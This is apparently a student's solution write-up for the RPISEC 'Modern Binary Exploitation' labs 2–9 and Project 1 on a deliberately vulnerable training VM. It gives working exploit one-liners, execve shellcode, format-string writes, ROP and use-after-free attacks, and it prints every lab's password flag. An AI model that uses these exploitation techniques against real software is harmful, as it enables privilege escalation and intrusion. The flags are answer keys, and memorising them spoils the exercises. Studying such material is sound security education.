# Modern Binary Exploitation
## Lab 2

### Lab 2C

```bash
./lab2C `printf 'aaaaaaaaaaaaaaa\xef\xbe\xad\xde'`
$ cat ~lab2B/.pass
1m_all_ab0ut_d4t_b33f
```

### Lab 2B
* RA is 0x1b bytes from the buffer we copy to
* shell is at 0x80486bd
* shell takes an arg
* 0804a028 D exec_string
* but it's a pointer
* 0x80487d0

```bash
lab2B@warzone:/levels/lab02$ ./lab2B `python -c 'print "a"*0x1b + "\xbd\x86\x04\x08" + "AAAA" + "\xd0\x87\x04\x08"'`
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaΩAAAA–á
$ cat ~lab2A/.pass
i_c4ll_wh4t_i_w4nt_n00b
```

### Lab 2A
* We can't overwrite the stack directly, but we can overwrite the value of i. We need to overwrite it to let us write a few extra bytes (16 in a 12 byte buffer), and then quit with a blank line
* The loop doesn't check that i is over a certain value, so we can put anything in i to have it run until overflow, writing as many bytes as we need, until we overwrite the RA, then send a blank line to quit out
* We need to use a subshell with a `cat -` so that we reconnect the stdin back to the terminal, otherwise the elevated shell has no stdin and won't run.
* 080486fd T shell

```bash
lab2A@warzone:/levels/lab02$ (printf "1234567890XX\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\xfd\n\x86\n\x04\n\x08\n\n"; cat -) | ./lab2A
Input 10 words:
Failed to read word
You got it
cat ~lab2end/.pass
D1d_y0u_enj0y_y0ur_cats?
```

## Lab 3

### Lab 3C
* We can overflow buth the username and the password
* username is in .data -> Static location for shellcode (0x08049c40)
* password is on stack -> can overwrite RA
* username must begin witn 'rpisec'

```bash
lab3C@warzone:/levels/lab03$ (python -c "import struct; print 'rpisec' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\n' + 'A'*0x50 + struct.pack('<L', 0x08049c40 + len('rpisec')) + '\n'"; cat) | ./lab3C
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

cat ~lab3B/.pass
th3r3_iz_n0_4dm1ns_0n1y_U!
```

### Lab 3B
* We can overflow a buffer on the stack
* The process forks, and the parent makes sure that the child does not call execve, if it does, it quit
* Need a shellcode that doesn't use execve: open, read, write instead.
  * http://shell-storm.org/shellcode/files/shellcode-73.php
* See lab3B.py.

```bash
lab3B@warzone:/levels/lab03$ python /tmp/lab3B.py|./lab3B
just give me some shellcode, k
wh0_n33ds_5h3ll3_wh3n_U_h4z_s4nd
child is exiting...
````

### Lab 3A
* Buffer on the stack in `main`
* Can read from any index
* Can write to any address, except for if the index is a multiple of three or the MSB is 0xb7 (That means 0 also)
* Write 4 bytes at a time
* Tried to patch out the checks, but the .text section is not writeable, so we cannot get around this restriction.

* Stack buffer at 0xbffff548 (in gdb).
* We will need to write shellcode that jumps over every 9-12th byte.

```asm
0:  31 c0                   xor    eax,eax
2:  50                      push   eax
3:  eb 2b                   jmp    30 <bin>
00000005 <back_bin>:
5:  5b                      pop    ebx
6:  eb 04                   jmp    c <hop1>
8:  cc                      int3
9:  cc                      int3
a:  cc                      int3
b:  cc                      int3
0000000c <hop1>:
c:  83 c3 07                add    ebx,0x7
f:  31 c9                   xor    ecx,ecx
11: 90                      nop
12: eb 04                   jmp    18 <hop2>
14: cc                      int3
15: cc                      int3
16: cc                      int3
17: cc                      int3
00000018 <hop2>:
18: 31 d2                   xor    edx,edx
1a: 31 c0                   xor    eax,eax
1c: b0 0b                   mov    al,0xb
1e: eb 04                   jmp    24 <hop3>
20: cc                      int3
21: cc                      int3
22: cc                      int3
23: cc                      int3
00000024 <hop3>:
24: cd 80                   int    0x80
26: 31 c0                   xor    eax,eax
28: 40                      inc    eax
29: cd 80                   int    0x80
2b: 90                      nop
2c: cc                      int3
2d: cc                      int3
2e: cc                      int3
2f: cc                      int3
00000030 <bin>:
30: e8 d0 ff ff ff          call   5 <back_bin>
35: 90                      nop
36: 90                      nop
37: 90                      nop
38: cc                      int3
39: cc                      int3
3a: cc                      int3
3b: cc                      int3
0000003c <bin_str>: "/bin/sh\x00"
```

See _lab3A.py_.

flag:sw00g1ty_sw4p_h0w_ab0ut_d3m_h0ps

## Lab 4
### Lab 4C
* We simply need to leak the flag that is read into a buffer.
* Format string vuln in the usernmae
* Password buffer comes first, then real password, then username.
* Fifth argument gets first 2 bytes of the password, and real password is 100 bytes later, meaning we must start at 5 + 100/4th -1 = 29th argument
* Password is 30 characters long, so we must leak 8 dwords
* See _lab4C.py_

```bash
lab4C@warzone:/levels/lab04$ python /tmp/lab4C.py
bu7_1t_w4sn7_brUt3_f0rc34b1e!
```

### Lab 4B
* Single buffer with format string vuln.
* Start of buffer at 6$.
* Any char in A-Z (0x41-0x5a) will be made lower case.
* `exit(0)` is called, so no overwriting RA.
* `exit@got.plt` is at 0x080499b8.
* Stack is executable, so we can point exit@plt to shell code
* Shell code will be modified if any bytes are capital letters
  * This includes `push eax` and `push ecx`.
  * Easily replaced with `sub esp, 4; mov [esp], <reg>`.
* See _lab4B.py_.

```bash
lab4B@warzone:/levels/lab04$ (python /tmp/lab4B.py; cat -) | ./lab4B
cat ~lab4A/.pass
fg3ts_d0e5n7_m4k3_y0u_1nv1nc1bl3
```

### Lab 4A
* Need to run from a directory that contains a writable _backups_ dir.
* Vuln is in snprintf
* String is unaligned (since it starts with a string "Starting back up: ".
* Since args come in argv, addresses will shift as argument changes size.
* Put a byte before the address (e.g. xAAAA) and can write to it through the 14th argument.
* RA at 0xbffff65c (76$) in gdb.
* Normal shellcode should work
* See _lab4A.py_.

```bash
lab4A@warzone:/tmp$ fixenv /levels/lab04/lab4A `python /tmp/lab4A.py`
$ id
uid=1016(lab4A) gid=1017(lab4A) euid=1017(lab4end) groups=1018(lab4end),1001(gameuser),1017(lab4A)
$ cat ~lab4end/.pass
1t_w4s_ju5t_4_w4rn1ng
```

## Lab 5
### Lab 5C
* Overflow in `copytoglobal`.
* Safely copied to a global (Gives us an easy spot to put "/bin/sh").
  * 0x804a060
* Uses `gets` so we can put in null bytes.
* RA overwritten after 156 bytes.
* Simple ret2libc
  * `system` at 0xb7e63190
* See _lab5C.py_.

```bash
lab5C@warzone:/levels/lab05$ (python /tmp/lab5C.py; cat -) | ./lab5C
I included libc for you...
Can you ROP to system()?
cat ~lab5B/.pass
s0m3tim3s_r3t2libC_1s_3n0ugh
```

### Lab 5B
* Statically compiled, so `system` is unavailable. Will need to do a ROP chain syscall.
* 140 bytes to flow into RA of `main`.
* Stack buf at 0xbffff6f0 (with `fixenv`)
* Can put nulls on stack because of `gets`.
  * This makes it very easy, we just need to set eax, ebx, and ecx correctly, we don't need to worry about using gadget to set up the args on the stack.
* See _lab5B.py_.

```bash
lab5B@warzone:/levels/lab05$ (python /tmp/lab5B.py; cat -) | ./lab5B
Insert ROP chain here:
cat ~lab5A/.pass
th4ts_th3_r0p_i_lik3_2_s33
```

### Lab 5A
* Very similar to lab3A.
  * Only a few differences:
    1. Index is now _unsigned_.
    2. It's compiled statically.
    3. Stack is NX.
    4. There is now a check that the index is under 100 (size of buffer).
      * This is a bug! Check should be that index is under _25_ (number of elements in array).
  * This means we can write anywhere before, up to 300 bytes past the end, which doesn't reach RA.
  * That means we will need to write our ROP code somewhere (in the buffer is fine) and then overwrite _store_number_'s RA with a stack pivot gadget.
* Every third DWORD again cannot be written to (again).
* Need to make a ROP chain that can handle these gaps: Just choose gadgets that pop extra, perhaps.
* There is a `add esp, 0x2c; ret` gadget, which jumps 44 extra bytes. RA of `store_number` happens to be _exactly_ 44 bytes in front of the buffer, plus the first element of the buffer cannot be written to (0 % 3 == 0), but that accounts for the four bytes that are removed by the return in the function itself!
* See _lab5A.py_.

```bash
lab5A@warzone:/levels/lab05$ (python /tmp/lab5A.py; cat -) | ./lab5A
----------------------------------------------------
  Welcome to doom's crappy number storage service!
          Version 2.0 - With more security!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   doom has reserved some storage for himself :>
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:
id
uid=1020(lab5A) gid=1021(lab5A) euid=1021(lab5end) groups=1022(lab5end),1001(gameuser),1021(lab5A)
cat ~lab5end/.pass
byp4ss1ng_d3p_1s_c00l_am1rite
```

## Project 1
* Hidden menu option 3 turns you into in admin, which reveals option 6, which prints addresses of tweets.
  * Also breaks the menu by printing a bad color code around the last tweet.
* Tweets are allocated with `calloc` and form a linked list.
* Linked list store the string _in band_, and the _next_ pointer at +0x10.
* Other than the first and second tweet, tweets are 0x20 bytes apart (though only 0x14 bytes in size).
* Any newline found in a tweet is replaced with 0xcc (`int 3`).
* After the _next_ pointer a 0xc3 (`ret`) is written in.
* You can login to become an admin, and then you can enable a debug mode that dumps the addresses of the tweets.
* 'secret' Password is 16 bytes read from _/dev/urandom_,
* 'generated' password is 16 bytes, generated using the secret password, the username, and the salt.
  * We can figure out the secret password from the generated password.
  * each byte password[i] = (secretpass[i] + salt[i]) ^ username[i]
  * therefore, secretpass[i] = (password[i] ^ username[i]) - salt[i]
* Admin mode also changes how the last tweet is printed in `last_tweet`: It uses `printf`, with the tweet body as the format string.
  * It also copies the tweet to the stack first.

* Format string is 0x1f bytes after the first argument to the vulnerable `printf`: Argument 8$.
* Can put shellcode in tweets, but they are only 16 bytes, so will need them to hop to the next.
* Second tweet is at 0x0804e040. This is where we will put the shellcode. It doesn't fit in 16 bytes so it'll have to jump to another tweet.
* Third tweet is at 0x0804e060.
* Can overwrite `exit@got.plt` which is at 0x0804d03c with the address of the second tweet.
* Tweets:
  1. doesn't matter.
  2. "\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x90\xEB\x10".
  3. "\x89\xE3\x50\x53\x89\xE1\xB0\x0B\xCD\x80".
  4. Write 0xe0 to second lsb of `exit@got.plt`.
  5. Write 0x40 to lsb of 'exit@got.plt'.
* See _project1.py_.

```bash
project1@warzone:/tmp$ python /tmp/project1.py
[+] Starting program '/levels/project1/tw33tchainz': Done
[*] PID: [3138]
[*] Paused (press any to continue)
[*] Password: 8f6d83b5673d78207a9b3b9a6fa02989
[*] Swapped password: b5836d8f20783d679a3b9b7a8929a06f
[*] Secret password: 75832d8fe038fd279afb9b3a89e9606f
[*] Switching to interactive mode
...
$ cat ~project1_priv/.pass
m0_tw33ts_m0_ch4inz_n0_m0n3y
```

## Lab 6
### Lab 6C
* Write a 40 char name and a 140 char tweet.
* We can write one byte into msglen, which determines how many chars we write into the tweet. We can then overflow in RA.
* There is no data leak, so we can't really explicitly put in the address of `secret_backdoor`. Need to use a partial overwrite.
* Last 12 bits of the address of `secret_backdoor` is always 0xX72b.
  * We can overwrite the 2 LSB of the RA, then have a 1/16 chance of getting it correct.
  * Will use 0x372b, since that's an easy "+7" in ASCII.
* Need to write exactly 198 bytes, so need to overwrite the msglen to that value.

(python -c "print 'A'*40+'\xc6\n'+'B'*196+'+7\n/bin/sh'"; cat -) |./lab6C

```bash
lab6C@warzone:/levels/lab06$ (python -c "print 'A'*40+'\xc6\n'+'B'*196+'+7\n/bin/sh'"; cat -) |./lab6C
--------------------------------------------
|   ~Welcome to l33t-tw33ts ~    v.0.13.37 |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: Tweet @Unix-Dude
>>: >: Tweet sent!

id
uid=1022(lab6C) gid=1023(lab6C) euid=1023(lab6B) groups=1024(lab6B),1001(gameuser),1023(lab6C)
cat ~lab6B/.pass
p4rti4l_0verwr1tes_r_3nuff
```

### Lab 6B
* Password is read into a heap buffer from a file.
* Password from file is 'hashed' by xoring each byte with the matching char in "lab6A", padded with 0x44, and stored back in _secret_pass_.
* Prompts for username and password, which are 'hashed' together, with the same padding.
* These hashes are compared, and if they match, a shell is spawned.
* We can write strings without null bytes to username and password - This can leak the stored ebp, and also hash past the end of password.
  * But in doing this, we will also 'hash' them, including corrupting the ra, but that will only fail when we run out of attempts... but our number of attempts is also corrupted.
* If we enter two sets of usernames and passwords, we should be able to exploit. Although we can leak and even repair what we messed up while hashing, we don't need a to, since the functions always have the same page offset and are on the same page, we can just control how the RA is hashed:
  * `login` is at 0xXXXXXaf4.
  * `login_prompt` returns to main+189 (0xXXXXXf7e)

1. Provide a username and password that are both 32 bytes in length (to hash beyond their end), and take care that the password that is 0x20 bytes before the RA on the stack, once hashed with the corresponding username, will have the RA to a value we want (0x058a)
2. Provide a username and password that will restore the attempts value, that way we don't have a huge number of attempts to exhaust.
   * Take care that we 'repair' the `attempts` count so we can cause `login_prompt` to return.
   * To go from 0xXf7e to 0xXaf4, xor with 0x058a
   * Because the hash hashes with the byte 0x20 bytes before itself, we need to put 0x8a at password + 0x14, 0x05 atpassword + 0x15.
   * The bytes after will get corrupt, so we need to control how (and reverse it)
   * We can put 0x20 at +0x16 and +0x17, and try twice to remove it.

* See _lab6B.py_.

### Lab 6A
* `merchant` struct on stack
* `ulisting` struct global
* A bunch of unused structs and functions:
  * `struct uinfo user`
  * `struct item aitem`
  * `write_wrap`
  * `make_note`
  * `print_name`.
* Menu system, where choice 3 calls the function in the local `merchant.sfunc`.
  * Follows desc in struct
* Trivial buffer overflow in desc into sfunc in `setup_account`.
* Should also be a leak if you fill desc to the brim. We can leak it by overwriting the function pointer in `merchant` with the address to `print_name`.
  * `print_listing` is at 0xb77XY9e0
  * `print_name` is at 0xb77XYbe2
  * We have to brute force the 'Y' nybble.
* With this leak we can get the address of `__libc_csu_init` which resides right after `merchant` in `main`'s stackframe.
* `system` is 0x19dc40 bytes before `__libc_csu_init`.
* See _lab6A.py_.

```bash
lab6A@warzone:/levels/lab06$ python /tmp/lab6A.py
[+] Starting program '/levels/lab06/lab6A': Done
[*] [1596]
[!] No luck, trying again
...
[+] Starting program '/levels/lab06/lab6A': Done
[*] [1629]
[*] Leak 0xb7736dd0
[*] system 0xb7599190
[*] Paused (press any to continue)
[*] Switching to interactive mode
Enter your name: Enter your description: Enter Choice: $ id
uid=1024(lab6A) gid=1025(lab6A) euid=1025(lab6end) groups=1026(lab6end),1001(gameuser),1025(lab6A)
$ cat ~lab6end/.pass
eye_gu3ss_0n_@ll_mah_h0m3w3rk
```

## Lab 7
### Lab 7C
* Can allocate up to 6 'strings' and 6 'numbers'
  * Actually both structs (`data` and `number`), 32 bytes each.
  * Both have function pointers, at `data+28` and `number+24`.
* When a number or string is deleted, the pointer is held (uaf).
* We can leak function address by creating a number, deleting it (to get it's pointer but free its memory), create a string (using that memory but setting the function pointer), and then print the number.
* Once we have a leak, we can delete everything, create a string with the argument we want, then delete it (preserving its pointer and value) then create a num on top. The string is _not_ overwritten since it's mostly within the num's reserved bytes.
* Finish by printing out the number.
* See _lab7C.py_.

```bash
lab7C@warzone:/levels/lab07$ python /tmp/lab7C.py
[+] Starting program '/levels/lab07/lab7C': Done
[*] [2812]
[*] Leaked short_str: 0xb775bbc7
[*] Switching to interactive mode
$ id
uid=1026(lab7C) gid=1027(lab7C) euid=1027(lab7A) groups=1028(lab7A),1001(gameuser),1027(lab7C)
$ cat ~lab7A/.pass
us3_4ft3r_fr33s_4re_s1ck
```

### Lab 7A

* ASLR, Partial RELRO, stack canaries, NX.
* **Statically linked**, with symbols
* Message struct holds a function pointer, the xor pad, the message, and the length of the message.
* Message and xor pad are stored as array of 32 4-byte ints. (128 bytes).
* There's an array of 10 message pointers.
* When a message is created, the first empty slot is selected.
* When a message is destroyed, that message is freed and the corresponding pointer is wiped out.
* xor pad is created randomly.
* Four choices in the menu.
  1. Create message
  2. Edit message
  3. Destroy message
  4. Print message (128 bytes always)
* We can enter a message that is up to 3 (`BLOCK_SIZE - 1`) bytes longer than there is room for when we create it
  * This will overflow into the length, allowing subsequent writes to write farther.
  * The encryption won't overflow, so we don't need to worry about our value getting messed up.
* Edit message doesn't check that the size is valid, allowing us to write much more.
  * We can overflow into the next message's `print_msg` pointer.
* Each allocation is 272 bytes from the previous (`struct msg` is 264 bytes).
* We can put data on the stack in the numbuf that `print_index` fills (when requesting the index). We need to make sure `strtoul` can still parse it, though.
  * numbuf starts 0x1c bytes after esp, so we need a gadget that does `add esp, xxx`.
* Now with the stack in numbuf, we have room for a few gadgets to make esp point to the overflowed buffer.
* edx holds the address of message 2.
* It was tricky to find how to get it into esp. Ended up being only `mov eax, edx; ret; xchg eax, esp; ret`.
* This will set _back_ to the `add esp, xxx` gadget! That's fine, since it'll add to esp just father into the overflow buffer.
* Using `ROPGadget --binary lab7A --ropchain` it generated a rop chain that worked on the first try.
* See _lab7A.py_.

```bash
lab7A@warzone:/levels/lab07$ python /tmp/lab7A.py
[+] Starting program '/levels/lab07/lab7A': Done
[*] [4597]
[*] Paused (press any to continue)
[*] Creating first message
[*] Paused (press any to continue)
[*] Creating second message
[*] Editing first message
[*] Paused (press any to continue)
[*] Printing second message
[*] Switching to interactive mode
 -----------------------------------------
-Input message index to print: $ id
uid=1027(lab7A) gid=1028(lab7A) euid=1028(lab7end) groups=1029(lab7end),1001(gameuser),1028(lab7A)
$ cat ~lab7end/.pass
0verfl0wz_0n_th3_h3ap_4int_s0_bad
```

## Lab 8
### Lab 8C

1. Parses both args
2. Opens files, but won't follow symlinks (O_NOFOLLOW)
3. Checks for bad file descriptors
4. Checks if fd is STDIN (0)
5. Compares the strings
   1. Allocs the fileComp struct
   2. Gets size of each file (fail if 255 bytes or bigger)
   3. Allocates buffer
   4. Reads it in
   5. Runs strcmp and stores result in the fileComp struct
6. Checks the filename doesn't contain ".pass"
7. Prints out both strings (or error message)

We can trick it by passing _/home/level8B/.pass_ as the first file, which opens it, and then passing its file descriptor (3) as the second.

```bash
lab8C@warzone:/levels/lab08$ ./lab8C -fn=/home/lab8B/.pass -fd=3
"<<<For security reasons, your filename has been blocked>>>" is lexicographically equivalent to "3v3ryth1ng_Is_@_F1l3"
```

### Lab 8B
* nx, aslr, PIE, canary.
* Three global vectors, plus an array of ten vector pointers
* v3 is intended as the sum vector.
* Vectors aren't in the code's order in the binary for some reason:
  * v1: 0x3040
  * v2: 0x3100
  * v3: 0x3080
  * faves: 0x30c0
  * So true order is: v1->v3->faves->v2
* Each vector starts with its `printFunc` pointing to `printf` but that is changed to `printVector` when you fill it with data.
* Saving a favorite copies the current sum (v3) into a new allocation and saves its pointer in next slot of `faves`.
  * This function has a bug where it starts copying 4*index bytes after the start of the vec.
* `printFaves` doesn't use the favorite's function pointer, it calls `printVector` directly.
* `loadFaves` will load an arbitrary favorite into a target vector.
* We can put values in v1 and v2 so that their sum is the address of `thisIsASecret`. We can then 'shift' this into the pointer in a favorite, and then copy it into a vector and print it.
* We need to take care that it's in an unsigned, 4 byte part of the vector, since the address has the msb set (or get trickier with negatives).
* Because of PIE we also need to 'leak' the address of `printVector` and use the offset from there.
  * We can just print the first vector right away: That gives the address of its `printFunc`.
* See _lab8B.py_

```bash
lab8B@warzone:/levels/lab08$ python /tmp/lab8B.py
[+] Starting program '/levels/lab08/lab8B': Done
[*] [1923]
[*] Paused (press any to continue)
[*] Print func at 0xb77270e9
[*] Secret func at 0xb77270a7
[*] Switching to interactive mode
...
$ id
uid=1030(lab8B) gid=1031(lab8B) euid=1031(lab8A) groups=1032(lab8A),1001(gameuser),1031(lab8B)
$ cat ~lab8A/.pass
Th@t_w@5_my_f@v0r1t3_ch@11
```

### Lab 8A

* Implements their own stack canary ("cookie") in `findSomeWords`
* Manual canary check saves a pointer to the canary plus the address 8 bytes before that and makes sure that they two xored = the canary xor 0xdeadbeef
  * Since we need to keep the canary the same, that means that we need the other value to be 0xdeadbeef.
* Need to leak the canary, which can be done in the previous function, using a format string vuln.
  * Argument `130$` leaks the canary.
* We can now build a string that contains 0xdeadbeef 16 bytes into the buffer, plus replace the canary.
* This will write a null bytes into the EBP, making the stack end up in a weird state, so we need to keep the ebp correct.
  * We can just leak the ebp from the previous function. Both functions take the same number of args so we don't even need to adjust it.
  * Argument `131$`.
* But now the RA will have the null byte. Luckily the RA is static, so we can just put it back.
* `ROPgadget` generated rop chain worked to get a shell (statically linked binary).
* See _lab8A.py_

```bash
lab8A@warzone:/tmp$ python ./lab8A.py
[+] Starting program '/levels/lab08/lab8A': Done
[*] [1145]
[*] Paused (press any to continue)
[*] Leaking canary and saved ebp
[*] Got canary 0x25c28100
[*] Got ebp 0xbffff6b8
[*] Check is expecting 0xfb6f3fef
[*] Switching to interactive mode
$ id
uid=1031(lab8A) gid=1032(lab8A) euid=1032(lab8end) groups=1033(lab8end),1001(gameuser),1032(lab8A)
$ cat ~lab8end/.pass
H4x0r5_d0nt_N33d_m3t4pHYS1c5
```

## Lab 9
### Lab 9C

* C++. Implements a 'vector' of ints that doesn't resize and only supports `get` and `append`.
* Bad bounds checking.
* For some reason `alloc_len` is set very incorrectly, letting us read a huge range of memory.
  * It's because alloc_len is based on the value of len, but runs before len is assigned a 1.
* Can leak canary at index 257 of the vector
* Can leak a libc address (index 0 is fine)
* Can use this to find `system` and "/bin/sh".
* Simple ret2libc.
* See _lab9C.py_.

```bash
lab9C@warzone:/levels/lab09$ python /tmp/lab9C.py
[+] Starting program '/levels/lab09/lab9C': Done
[*] [1443]
[*] Paused (press any to continue)
[*] Got leaked address at 0xb7d4dffd
[*] Found system at 0xb7d7b190
[*] Found '/bin/sh' at 0xb7e9ba24
[*] found canary 0x59006c00
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ id
uid=1033(lab9C) gid=1034(lab9C) euid=1034(lab9A) groups=1035(lab9A),1001(gameuser),1034(lab9C)
$ cat ~lab9A/.pass
1_th0uGht_th4t_w4rn1ng_wa5_l4m3
```

### Lab 9A

* A hashset implementation, whose hashfunc is defined in a simple callable class instance.
* The hash function just returns the number itself.
* Allows you to allocate unlimited `hashset_int`s, into one of 8 slots.
* We can allocate an array of ints of any size when we create a hash set.
* Use after free.
* We want to allocated a few hashsets, free them, and then allocate a larger one over the old ones so that we can control the vtable pointer.
* Need to leak both libc (for `system`) and the heap address.
* Want to overwrite the `add` method in the vtable.
* Because the `this` argument is implicit, but we control the second, we need to jump farther into `system` so that the stack is offset by four.
  * `system` + 1 is perfect.
* Worked on this with uafio.
* See _lab9A.py_.

```bash
lab9A@warzone:/levels/lab09$ python /tmp/lab9A.py
[*] For remote: /tmp/lab9A.py HOST PORT
[+] Starting program '/levels/lab09/lab9A': Done
[*] [3504]
[*] Paused (press any to continue)
[*] leak_libc: 0xb7639450
[*] leak_heap: 0x9c38888
[*] system magic: 0xb74cf191
[*] Vtable addr: 0x9c38080
[*] Using size 1361
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ id
uid=1034(lab9A) gid=1035(lab9A) euid=1035(lab9end) groups=1036(lab9end),1001(gameuser),1035(lab9A)
$ cat ~lab9end/.pass
1_d1dNt_3v3n_n33d_4_Hilti_DD350
```
